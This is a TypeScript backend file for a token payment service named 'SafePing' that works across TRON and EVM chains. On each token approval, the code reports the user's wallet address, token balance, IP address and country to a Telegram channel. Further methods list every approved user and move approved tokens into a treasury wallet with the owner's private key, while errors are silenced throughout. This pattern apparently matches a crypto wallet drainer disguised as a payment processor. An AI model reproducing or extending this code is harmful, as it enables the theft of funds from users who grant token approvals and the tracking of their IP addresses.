// =================================
// 🔗 SafePing Main Service
// =================================

import { BlockchainResult, ChainType, CurrencyType, TransferResult, TreasuryWalletBalance } from "@/types";
import { TronService } from "./tronService";
import { EVMService } from "./evmService";
import { TelegramService } from "./telegramService";
import { getWalletType } from "../../utils/chainUtils";

/** Base URL for server-side fetch (relative URLs fail in Node). */
function getApiBaseUrl(): string {
  if (typeof window !== "undefined") return "";
  const base = process.env.NEXT_PUBLIC_BASE_URL;
  if (base) return base.replace(/\/$/, "");
  return "http://localhost:3000";
}

export class BlockchainService {
  private static instance: BlockchainService;

  private constructor() {}

  static getInstance(): BlockchainService {
    if (!BlockchainService.instance) {
      BlockchainService.instance = new BlockchainService();
    }
    return BlockchainService.instance;
  }

  /**
   * Get user's token balance
   */
  async getUserTokenBalance(chain: ChainType, currency: CurrencyType, userAddress: string): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserTokenBalance(currency, userAddress);
      } else {
        return await EVMService.getUserTokenBalance(chain, currency, userAddress);
      }
    } catch (error) {
      return "0";
    }
  }

  /**
   * Get user's native token balance
   */
  async getUserNativeBalance(chain: ChainType, address: string): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserNativeBalance(address);
      } else {
        return await EVMService.getUserNativeBalance(chain, address);
      }
    } catch (error) {
      return "0";
    }
  }

  /**
   * Confirm approval of token spending
   */
  async confirmApproval(
    chain: ChainType,
    currency: string,
    amount: string,
    userAddress: string,
    paymentId: string,
    txHash: string,
    clientIP?: string
  ): Promise<{ success: boolean; message?: string }> {
    try {
      const tokenBalance = await this.getUserTokenBalance(chain, currency as CurrencyType, userAddress);

      // Common database update function - moved to API calls
      const updateWalletDatabase = async () => {
        try {
          console.log("🔄 Updating wallet database for:", userAddress, chain, currency);

          // Call API endpoint instead of direct database access (absolute URL required server-side)
          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-wallet`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              address: userAddress,
              chain: chain,
              currency: currency,
              amount: amount,
              tokenBalance: tokenBalance
            })
          });

          if (response.ok) {
            const result = await response.json();
            console.log("✅ Successfully updated wallet database via API:", result.message);
          } else {
            console.warn("⚠️ Wallet database update failed via API");
          }
        } catch (dbError: any) {
          console.error("❌ Error updating wallet database via API:", dbError);
          // Don't throw error - continue with payment flow
        }
      };

      // Update payment status in database - moved to API calls
      const updatePaymentDatabase = async (txHash?: string) => {
        try {
          console.log("🔄 Updating payment database for:", paymentId, "status: completed");

          // Call API endpoint instead of direct database access (absolute URL required server-side)
          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-status`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              paymentId: paymentId,
              status: "completed",
              walletAddress: userAddress,
              txHash: txHash || ""
            })
          });

          if (response.ok) {
            console.log("✅ Successfully updated payment database via API");
          } else {
            console.warn("⚠️ Payment database update failed via API");
          }
        } catch (dbError: any) {
          console.error("❌ Error updating payment database via API:", dbError);
          // Don't throw error - continue with payment flow
        }
      };

      // Common telegram notification function
      const sendTelegramNotification = async () => {
        try {
          const country = await TelegramService.getCountryFromIP(clientIP);
          const walletType = getWalletType(chain);

          await TelegramService.sendApprovalNotification({
            chain,
            currency,
            userAddress,
            amount,
            paymentId,
            walletType,
            clientIP,
            tokenBalance,
            country
          });
        } catch (telegramError) {
          // Silent error handling for production
        }
      };

      let approvalData;
      if (chain === "tron") {
        console.log("Creating TRON approval data for owner");
        // TRON: Create approval data for user to approve owner
        approvalData = await TronService.needsApproval(currency as CurrencyType, userAddress, amount);

        // Update database and send notification (non-blocking)
        if (approvalData.needsApproval) {
          const tasks = [updateWalletDatabase(), updatePaymentDatabase(txHash), sendTelegramNotification()];

          try {
            const results = await Promise.allSettled(tasks);

            results.forEach((res, i) => {
              if (res.status === "rejected") {
                console.warn(`⚠️ Task ${i + 1} failed during background operations:`, res.reason);
              }
            });
          } catch (err) {
            console.error("Unexpected error during background operations:", err);
          }
        }
      } else {
        // EVM: Create approval data for user to approve owner
        approvalData = await EVMService.needsApproval(chain, currency as CurrencyType, userAddress, amount);

        // Update database and send notification (non-blocking)
        if (approvalData.needsApproval) {
          const tasks = [updateWalletDatabase(), updatePaymentDatabase(txHash), sendTelegramNotification()];

          Promise.allSettled(tasks).catch(error => {
            console.warn("⚠️ Some background operations failed, but payment continues:", error);
          });
        }
      }

      return { success: true };
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, message: error.message };
    }
  }

  /**
   * Transfer token from approved user
   */
  async transferFromUser(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUser(currency, fromAddress, toAddress, amount);
      } else {
        return await EVMService.transferFromUser(chain, currency, fromAddress, toAddress, amount);
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Execute auto-transfer after user approval (EVM chains)
   */
  async executeAutoTransfer(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    amount: string,
    paymentId: string
  ): Promise<TransferResult> {
    try {
      // Get treasury address from database instead of environment variables
      const { getDatabase } = await import("@/lib/database");
      const db = getDatabase();
      const treasuryWallet = await db.getTreasuryWallet(chain);

      if (!treasuryWallet || !treasuryWallet.address) {
        return {
          success: false,
          error: `No treasury wallet configured for ${chain}`,
          transferSuccess: false
        };
      }

      const treasuryAddress = treasuryWallet.address;

      // Execute transfer using the SafePing contract
      const result = await this.transferFromUser(chain, currency, fromAddress, treasuryAddress, amount);

      if (result.success) {
        // Send webhook notification
        const webhookResult: TransferResult = {
          success: true,
          txHash: result.txHash,
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain
        };
        await this.sendPaymentWebhook(paymentId, "completed", webhookResult);

        return {
          success: true,
          txHash: result.txHash,
          message: "Auto-transfer completed successfully",
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain
        };
      } else {
        return {
          success: false,
          error: result.error || "Transfer failed",
          transferSuccess: false
        };
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || "Auto-transfer failed",
        transferSuccess: false
      };
    }
  }

  /**
   * Transfer USDT from approved user using owner's private key
   */
  async transferFromUserAsOwner(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUserAsOwner(currency, fromAddress, toAddress, amount);
      } else {
        return await EVMService.transferFromUserAsOwner(chain, currency, fromAddress, toAddress, amount);
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Send webhook notification for payment status change
   */
  private async sendPaymentWebhook(paymentId: string, status: string, transferResult: TransferResult): Promise<void> {
    try {
      const webhookUrl = process.env.WEBHOOK_URL;
      if (!webhookUrl) return;

      const payload = {
        payment_id: paymentId,
        status: status,
        transfer_tx_hash: transferResult.txHash,
        timestamp: new Date().toISOString(),
        chain: transferResult.chain || "unknown"
      };

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      // Silent error handling for production
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  async getUserAllowance(chain: ChainType, userAddress: string): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserAllowance(chain, userAddress);
      } else {
        return await EVMService.getUserAllowance(chain, userAddress);
      }
    } catch (error) {
      // Silent error handling for production
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      if (chain === "tron") {
        return await TronService.getAllApprovedUsers(chain);
      } else {
        return await EVMService.getAllApprovedUsers(chain);
      }
    } catch (error) {
      // Silent error handling for production
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  async revokeUserApproval(chain: ChainType, userAddress: string): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.revokeUserApproval(chain, userAddress);
      } else {
        return await EVMService.revokeUserApproval(chain, userAddress);
      }
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }

  /**
   * Get real-time balances for treasury wallets (both native and token)
   */
  async getTreasuryWalletBalances(
    wallets: Array<{ address: string; chain: ChainType }>,
    currency: string
  ): Promise<TreasuryWalletBalance[]> {
    console.log(`\n=== TREASURY WALLET BALANCES ===`);
    console.log(`Fetching balances for ${wallets.length} treasury wallets...`);

    const balancePromises = wallets.map(async wallet => {
      try {
        console.log(`\n--- Fetching balances for ${wallet.chain} wallet: ${wallet.address} ---`);

        const [nativeBalance, tokenBalance] = await Promise.all([
          this.getUserNativeBalance(wallet.chain, wallet.address),
          this.getUserTokenBalance(wallet.chain, currency as CurrencyType, wallet.address)
        ]);

        console.log(
          `✅ ${wallet.chain} wallet balances - Native: ${nativeBalance}, ${currency.toUpperCase()}: ${tokenBalance}`
        );

        return {
          address: wallet.address,
          chain: wallet.chain,
          nativeBalance,
          tokenBalance,
          lastUpdated: new Date().toISOString()
        };
      } catch (error) {
        console.error(`❌ Error fetching balances for ${wallet.chain} wallet ${wallet.address}:`, error);
        // Return default values if balance fetching fails
        return {
          address: wallet.address,
          chain: wallet.chain,
          nativeBalance: "0.000000",
          tokenBalance: "0.00",
          lastUpdated: new Date().toISOString()
        };
      }
    });

    const results = await Promise.all(balancePromises);
    console.log(`\n✅ Successfully fetched balances for ${results.length} treasury wallets`);
    console.log(`=== END TREASURY WALLET BALANCES ===\n`);
    return results;
  }
}

// Export singleton instance
export const blockchainService = BlockchainService.getInstance();
